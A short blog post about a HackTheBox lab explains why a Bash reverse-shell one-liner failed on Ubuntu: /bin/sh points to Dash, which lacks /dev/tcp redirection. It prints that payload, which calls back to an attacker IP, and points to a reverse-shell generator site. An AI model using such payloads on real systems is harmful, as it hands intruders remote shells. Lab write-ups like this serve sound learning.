---
date: "2026-04-02T00:00:00-06:00"
draft: false
title: "TIL About Redirection in Bash"
type: "post"
description: "Not all shells are created equal."
tags: ["bash", "hackthebox"]
slug: "til-about-redirection-in-bash"
---

This week, my team was cooperatively working on hacking an Ubuntu machine on HackTheBox and got to the point of exploiting a Command Injection vulnerability. Naturally, my first suggestion was to pop over to [revshells](https://www.revshells.com) to quickly get a reverse shell payload we could copy/paste.

After starting a listener on the attacker machine, we grabbed the first Bash reverse shell entry labelled `Bash -i`:

```sh
sh -i >& /dev/tcp/10.10.14.2/9000 0>&1
```

We fired it and....nothing. No shell caught. We double-checked the IP addresses, restarted the listener, verified we could `curl` the attacker machine, but still we didn't get a callback. This should be a pretty straight-forward part of the attack chain and I know I've used this payload many times before.

We ended up switching to a Python payload instead which worked just fine, but I really wanted to know _why_ the Bash shell hadn't worked.

## Why It Didn't Work

I learned that the shell feature that allows you to redirect `stdout` and `stderr` to a TCP socket like `/dev/tcp/10.10.10.10/9001` is called "[network redirection](https://www.gnu.org/software/bash/manual/html_node/Redirections.html)" and seems to be unique to Bash.

Notably, it does not seem to be present in Zsh, fish, or the Busybox/Android variants. Crucially, it is also not supported by [Dash](https://wiki.archlinux.org/title/Dash) which I learned is what `/bin/sh` is symlinked to in some modern distros _including Ubuntu_.

If you want to test whether your shell supports the feature:

- Start an HTTP webserver on some port
- Run `: </dev/tcp/127.0.0.1/PORT_HERE`

If your shell supports the feature, you will get no output but no error. If it doesn't, you should get an error like

```
cannot open /dev/tcp/127.0.0.1/8080: No such file
```

Lesson learned: "Bash" means "Bash".
